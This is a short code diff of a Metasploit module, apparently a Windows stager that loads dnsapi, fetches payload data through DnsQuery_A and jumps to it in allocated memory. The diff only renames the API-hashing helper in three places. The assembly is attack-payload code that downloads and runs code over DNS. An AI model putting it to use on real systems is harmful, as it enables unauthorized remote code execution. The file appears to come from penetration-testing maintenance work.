@@ -89,7 +89,7 @@ module MetasploitModule
       push eax		; flAllocationType MEM_COMMIT (0x1000)
       push eax		; dwSize (0x1000)
       push 0x0		; lpAddress
-      push #{Rex::Text.hash("kernel32.dll", "VirtualAlloc")}        	; kernel32.dll!VirtualAlloc
+      push #{Rex::Text.block_api_hash("kernel32.dll", "VirtualAlloc")}        	; kernel32.dll!VirtualAlloc
       call ebp
       push eax		; save pointer on stack, will be used in memcpy
       mov #{bufferreg}, eax	; save pointer, to jump to at the end
@@ -103,7 +103,7 @@ module MetasploitModule
       push eax        	; Push 'dnsapi' to the stack
       push 0x61736e64        	; ...
       push esp               	; Push a pointer to the 'dnsapi' string on the stack.
-      push #{Rex::Text.hash("kernel32.dll", "LoadLibraryA")}        	; kernel32.dll!LoadLibraryA
+      push #{Rex::Text.block_api_hash("kernel32.dll", "LoadLibraryA")}        	; kernel32.dll!LoadLibraryA
       call ebp               	; LoadLibraryA( "dnsapi" )
 
     ;prepare for loop of queries
@@ -126,7 +126,7 @@ module MetasploitModule
       push #{queryoptions}	; Options
       push #{wType}		; wType
       push eax		; lpstrName
-      push #{Rex::Text.hash("dnsapi.dll", "DnsQuery_A")} 	; dnsapi.dll!DnsQuery_A
+      push #{Rex::Text.block_api_hash("dnsapi.dll", "DnsQuery_A")} 	; dnsapi.dll!DnsQuery_A
       call ebp		;
       test eax, eax		; query ok ?
       jnz jump_to_payload	; no, jump to payload
